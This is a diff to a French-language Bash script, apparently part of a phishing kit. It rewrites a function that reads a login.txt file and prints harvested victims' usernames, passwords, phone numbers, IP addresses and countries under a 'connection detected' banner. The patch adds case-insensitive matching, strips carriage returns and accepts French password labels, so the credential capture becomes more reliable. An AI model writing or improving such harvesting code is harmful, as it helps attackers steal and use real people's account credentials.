@@ -10,21 +10,29 @@ NC='\033[0m' # Pas de couleur
 
 # Fonction pour afficher les données de connexion
 afficher_donnees() {
-    echo -e "\n${CYAN}\n\n═════════CONNEXION DÉTECTÉE ═══${NC}"
-    while IFS= read -r ligne; do
-        if [[ "$ligne" == *"Username:"* ]]; then
-            echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne#*: }"
-        elif [[ "$ligne" == *"Password:"* ]]; then
-            echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne#*: }"
-        elif [[ "$ligne" == *"Phone:"* ]]; then
-            echo -e "${VERT}📞 Téléphone: ${NC}${ligne#*: }"
-        elif [[ "$ligne" == *"IP:"* ]]; then
-            echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne#*: }"
-        elif [[ "$ligne" == *"Country:"* ]]; then
-            echo -e "${VERT}🌍 Pays: ${NC}${ligne#*: }"
-        fi
-    done < login.txt
-    echo -e "${CYAN}═🚨🚨 ouvrez une autre page\n et TAPEZ nano login.txt\n pour voir les identifiants 🚨${NC}\n"
+    echo -e "\n${CYAN}\n\n═════════ CONNEXION DÉTECTÉE ═══ ${NC}"
+while IFS= read -r ligne || [[ -n "$ligne" ]]; do
+    ligne_clean=$(echo "$ligne" | tr -d '\r')  # Supprimer les \r invisibles
+    case "$ligne_clean" in
+        *[Uu]sername:*)
+            echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Pp]assword:*|*[Mm]ot\ de\ passe:*)
+            echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Pp]hone:*)
+            echo -e "${VERT}📞 Téléphone: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Ii][Pp]:*)
+            echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Cc]ountry:*)
+            echo -e "${VERT}🌍 Pays: ${NC}${ligne_clean#*: }"
+            ;;
+    esac
+done < login.txt
+
+echo -e "${CYAN}═🚨🚨 Ouvrez une autre page\net TAPEZ nano login.txt\npour voir les identifiants 🚨${NC}\n"
 }
 
 # Fonction pour surveiller et afficher les données PHP en temps réel
